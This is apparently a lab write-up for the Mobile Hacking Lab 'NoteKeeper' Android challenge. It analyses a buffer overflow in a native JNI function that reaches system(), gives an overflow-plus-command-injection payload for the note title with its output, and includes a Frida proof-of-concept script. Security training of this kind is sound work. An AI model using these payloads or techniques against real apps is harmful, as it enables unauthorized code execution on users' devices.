---
title: Notekeeper - Mobile Hacking Lab
date: 2025-3-1 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase

---



<br />

### Introduction

Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.

<br />

### Objective

Exploit the buffer overflow vulnerability and achieve Remote Code Execution (RCE).

<br />





Upon clicking the button, two input fields appear: one for entering the note's title and the other for writing its content.

![](/assets/img/mhl/Notekeeper/1.png)



<br />

Then, the title, content, and the number of characters in the content are displayed on the UI.

![](/assets/img/mhl/Notekeeper/2.png)





<br /><br />

Submitting a note with an empty title or content is not allowed.



![](/assets/img/mhl/Notekeeper/3.png)



<br />

<br /><br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<activity
    android:name="com.mobilehackinglab.notekeeper.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```



<br /><br />

From: com.mobilehackinglab.notekeeper.MainActivity

```java
package com.mobilehackinglab.notekeeper;

public final class MainActivity extends AppCompatActivity {
    private FloatingActionButton fab;
    private final List<note_data> notes = new ArrayList();
    private Note_Adapter notes_adp;
    private RecyclerView rv;

    public final native String parse(String Title);

    public final List<note_data> getNotes() {
        return this.notes;
    }
    
    
    
    public static final void showDialogue$lambda$1(EditText $ed_title, EditText $ed_content, MainActivity this$0, Dialog dialog, View it) {
    Intrinsics.checkNotNullParameter(this$0, "this$0");
    Intrinsics.checkNotNullParameter(dialog, "$dialog");
    String title_ = $ed_title.getText().toString();
    String note_con = $ed_content.getText().toString();
    if (title_.length() > 0) {
        if (note_con.length() > 0) {
            String cap_title = this$0.parse(title_);
            note_data dataElement = new note_data(cap_title, note_con, "Number of characters : " + note_con.length());
            this$0.notes.add(dataElement);
            Note_Adapter note_Adapter = this$0.notes_adp;
            if (note_Adapter == null) {
                Intrinsics.throwUninitializedPropertyAccessException("notes_adp");
                note_Adapter = null;
            }
            note_Adapter.notifyDataSetChanged();
            dialog.dismiss();
            return;
        }
    }
    Toast.makeText(this$0, "Don't leave the title or note field empty", 0).show();
}

    
    
        static {
        System.loadLibrary("notekeeper");
    }
}

```

`System.loadLibrary("notekeeper")` allows the application to load and access the native shared library named `libnotekeeper.so` via the Java Native Interface (JNI). This library contains native code written in C or C++ and is typically used to perform operations that require low-level system access, improved performance, or functionality not easily achievable with Java or Kotlin alone.

<br /><br />

Let’s use the apktool tool to decompile the APK:

```
apktool d com.mobilehackinglab.notekeeper.apk
```

Go to the `lib` directory, locate and extract the `libnotekeeper.so` shared library, then load it into Ghidra for analysis.

<br /><br />



By examining the function call tree of the `parse()` function, we observe that it eventually invokes the `system()` function.

<br />

![](/assets/img/mhl/Notekeeper/5.png)



<br /><br />

![](/assets/img/mhl/Notekeeper/6.png)



<br /><br />

```c
undefined8
Java_com_mobilehackinglab_notekeeper_MainActivity_parse
          (_JNIEnv *param_1,undefined8 param_2,_jstring *param_3)

{
  int local_2a8;
  char local_2a4 [100];
  char acStack_240 [500];
  int local_4c;
  ushort *local_48;
  _jstring *local_40;
  undefined8 local_38;
  _JNIEnv *local_30;
  undefined8 local_28;
  
  local_40 = param_3;
  local_38 = param_2;
  local_30 = param_1;
  local_48 = (ushort *)_JNIEnv::GetStringChars(param_1,param_3,(uchar *)0x0);
  local_4c = _JNIEnv::GetStringLength(local_30,local_40);
  memcpy(acStack_240,"Log \"Note added at $(date)\"",500);
  if (local_48 == (ushort *)0x0) {
    local_28 = 0;
  }
  else {
    local_2a4[0] = FUN_00100bf4(*local_48 & 0xff);
    for (local_2a8 = 1; local_2a8 < local_4c; local_2a8 = local_2a8 + 1) {
      local_2a4[local_2a8] = (char)local_48[local_2a8];
    }
    system(acStack_240);
    local_2a4[local_2a8] = '\0';
    local_28 = _JNIEnv::NewStringUTF(local_30,local_2a4);
  }
  return local_28;
}
```

<br />

Let’s analyze this native code:

<br />

**local_2a4**
 A 100-byte buffer used for processing the input.

<br />

**acStack_240**
 A 500-byte buffer used to execute the system command.

<br />

**GetStringChars**
 This function retrieves the Java String (param_3) and converts it into a C array (local_48).

<br />

**GetStringLength**
 It stores the length of the input in the variable `local_4c`.

<br />

```c
memcpy(acStack_240, "Log "Note added at $(date)"", 500);
system(acStack_240);
```

<br />

**memcpy**
 This function copies a fixed command into the `acStack_240` buffer. The command logs the "Log" message and the output of the `date` command.

**system**
 It executes the command stored in the `acStack_240` buffer.

Since the buffer overflow affects this buffer, a malicious command could be executed.

<br />

<br />

---

**memcpy() Function**

```c
void *memcpy(void *dest, const void *src, size_t n);
```

 **Parameters**

- **`dest`**: Pointer to the destination memory block where you want to copy data.
- **`src`**: Pointer to the source memory block from where data will be copied.
- **`n`**: Number of **bytes** to copy.

<br />

**What It Does**

`memcpy()` copies `n` bytes from memory area `src` to memory area `dest`.

It does **not** check for overlap — if source and destination overlap, behavior is **undefined** (use `memmove()` instead in that case).

Notes:

- `memcpy()` is **fast** and widely used for raw memory operations.

- It’s **byte-based**, not character- or type-aware.

- Be careful not to **overflow** the destination buffer.

- Unlike `strcpy()`, it **does not stop at null characters (`\0`)** — it copies the exact number of bytes you specify.

<br />

--------

**Buffer Overflow Analysis:**

If `local_48` is null, no operation is performed, and `local_28` is set to zero. Otherwise:

- The first byte of the `local_48` array is processed and stored in `local_2a4[0]`.
- A loop then copies the remaining bytes of `local_48` into the `local_2a4` array, ensuring null-termination at the end.

However, the vulnerability is in the following loop:

```c
for (local_2a8 = 1; local_2a8 < local_4c; local_2a8++) {
    local_2a4[local_2a8] = (char)local_48[local_2a8];
}
```

**Buffer Overflow Vulnerability:**

- **local_2a4** can only store up to 100 bytes, but the loop does not check if `local_4c` exceeds this size.
- If `local_4c` (the input length) is greater than 100, this overflows the `local_2a4` buffer and can overwrite adjacent memory, including the function return address or system buffer.



<br /><br />

**Exploitation Path:**

1. **Send a String longer than 100 bytes** to trigger the overflow in `local_2a4`.
2. **Manipulate the `system()` function call.** If the buffer overflow affects `acStack_240`, the command in this buffer can be modified.
3. **Execute a malicious command** via the `system()` call, exploiting the buffer overflow and achieving Remote Code Execution (RCE).

This buffer overflow can potentially allow an attacker to inject a malicious command into the `system()` call, triggering an RCE vulnerability.



<br /><br />



Submit this payload in the note title

```bash
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;id > /data/data/com.mobilehackinglab.notekeeper/id.txt;
```

<br />

![](/assets/img/mhl/Notekeeper/8.png)

<br /><br />







![](/assets/img/mhl/Notekeeper/9.png)





<br /><br />

The payload has executed successfully.

```bash
star2qltechn:/data/data/com.mobilehackinglab.notekeeper # ls
cache code_cache files id.txt

star2qltechn:/data/data/com.mobilehackinglab.notekeeper # cat id.txt
uid=10069(u0_a69) gid=10069(u0_a69) groups=10069(u0_a69),3003(inet),9997(everybody),20069(u0_a69_cache),50069(all_a69) context=u:r:untrusted_app:s0:c69,c256,c512,c768
```





<br /><br />

**Frida script PoC**

 a Frida script to exploit the buffer overflow vulnerability:

```javascript
Java.perform(function() {
    
    var MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    const JavaString = Java.use('java.lang.String');

    
    MainActivity.parse.implementation = function(str) {
        console.log("Input: " + str);
        
        const payload = JavaString.$new("a".repeat(120) + "; ls /data/data/com.mobilehackinglab.notekeeper > /data/data/com.mobilehackinglab.notekeeper/ls.txt;");

        console.log("Payload: " + payload);
        
        const result = this.parse(payload);

        console.log("Return Value: " + result);

        return result;
    };
});
```

<br />

```java
frida -U -f com.mobilehackinglab.notekeeper -l frida.js
```

